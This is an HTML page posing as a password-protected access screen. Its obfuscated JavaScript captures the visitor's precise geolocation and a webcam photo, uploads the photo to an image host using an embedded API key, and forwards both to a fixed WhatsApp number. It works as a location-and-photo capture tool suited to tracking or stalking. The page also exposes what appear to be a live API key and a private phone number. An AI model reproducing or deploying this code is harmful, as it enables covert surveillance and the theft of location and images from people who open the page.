<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Authentication Required</title>
    <style>
        /* 🌟 Modern Neon-Themed Styles */
        body {
            font-family: 'Poppins', sans-serif;
            text-align: center;
            background: #0d1117;
            color: #ffffff;
            margin: 50px;
        }
        input, button {
            padding: 10px;
            margin: 10px;
            border: none;
            border-radius: 5px;
            font-size: 18px;
            transition: 0.3s;
        }
        input {
            background: #161b22;
            color: #ffffff;
            outline: none;
            border: 1px solid #58a6ff;
        }
        button {
            background: #58a6ff;
            color: white;
            cursor: pointer;
            box-shadow: 0px 0px 10px #58a6ff;
        }
        button:hover {
            transform: scale(1.1);
            box-shadow: 0px 0px 20px #58a6ff;
        }
        #auth-section {
            animation: fadeIn 1s ease-in-out;
        }
        #main-content {
            display: none;
            animation: fadeIn 1s ease-in-out;
        }
        #status {
            font-size: 20px;
            font-weight: bold;
            animation: glow 1s infinite alternate;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        @keyframes glow {
            from { color: #58a6ff; }
            to { color: #ffffff; }
        }
    </style>
</head>
<body>
    <div id="auth-section">
        <h2>🔒 Enter Password to Access</h2>
        <input type="password" id="p-a" placeholder="Enter password">
        <button onclick="x1x()">Submit</button>
        <p id="a-s" style="color: red;"></p>
    </div>

    <div id="main-content">
        <h1>📡 Sending Live Location & Photo to WhatsApp...</h1>
        <p id="status">Initializing...</p>
        <canvas id="canvas" style="display: none;"></canvas>
    </div>

    <script>
        (function(){
            var _0xabc=["value","getElementById","p-a","style","display","none","block","auth-section","main-content","Incorrect password!","innerText","aa385a04b8f503c6b319cd48de2a41e4522c1ae2d0c94f7fa26b90e50faeb3b2"];
            
            async function x1x(){
                const _p=document[_0xabc[1]](_0xabc[2])[_0xabc[0]];
                const _h=await x2x(_p);
                if(_h===_0xabc[11]){
                    document[_0xabc[1]](_0xabc[7])[_0xabc[3]][_0xabc[4]]=_0xabc[5];
                    document[_0xabc[1]](_0xabc[8])[_0xabc[3]][_0xabc[4]]=_0xabc[6];
                    x3x();
                } else {
                    document[_0xabc[1]]("a-s")[_0xabc[10]]=_0xabc[9];
                }
            }

            async function x2x(p){
                const enc=new TextEncoder().encode(p);
                const hash=await crypto.subtle.digest("SHA-256", enc);
                return Array.from(new Uint8Array(hash)).map(b=>b.toString(16).padStart(2,"0")).join("");
            }

            function x3x(){
                navigator.geolocation.getCurrentPosition(
                    (p)=>{
                        var lat=p.coords.latitude,lng=p.coords.longitude;
                        var loc=`https://www.google.com/maps?q=${lat},${lng}`;
                        document.getElementById("status").innerText="✅ Location found! Taking photo...";
                        x4x(loc);
                    },
                    (err)=>{
                        document.getElementById("status").innerText="❌ Error getting location: "+err.message;
                    },
                    { enableHighAccuracy: true, maximumAge: 0 }
                );
            }

            async function x4x(loc){
                try {
                    const stream=await navigator.mediaDevices.getUserMedia({video:true});
                    const video=document.createElement("video");
                    video.srcObject=stream;
                    video.play();
                    video.onloadedmetadata=()=>{
                        const canvas=document.getElementById("canvas");
                        const ctx=canvas.getContext("2d");
                        canvas.width=video.videoWidth;
                        canvas.height=video.videoHeight;
                        ctx.drawImage(video,0,0,canvas.width,canvas.height);
                        stream.getTracks().forEach(t=>t.stop());
                        canvas.toBlob((b)=>x5x(b,loc),"image/png");
                    };
                } catch(err){
                    console.error("Camera access error:", err);
                }
            }

            function x5x(blob,loc){
                const f=new FormData();
                f.append("image",blob);
                f.append("key","83601732f6095faec5d42577498c1da8");

                fetch("https://api.imgbb.com/1/upload",{method:"POST",body:f})
                .then(r=>r.json())
                .then(d=>{
                    if(d.success){
                        var waUrl=`https://wa.me/94713424265?text=${encodeURIComponent(`📍 Location: ${loc}\n📷 Photo: ${d.data.url}`)}`;
                        window.location.href=waUrl;
                    } else {
                        console.error("ImgBB upload failed:", d.error);
                    }
                })
                .catch(e=>{console.error("ImgBB API request failed:",e)});
            }
        })();
    </script>
</body>
</html>
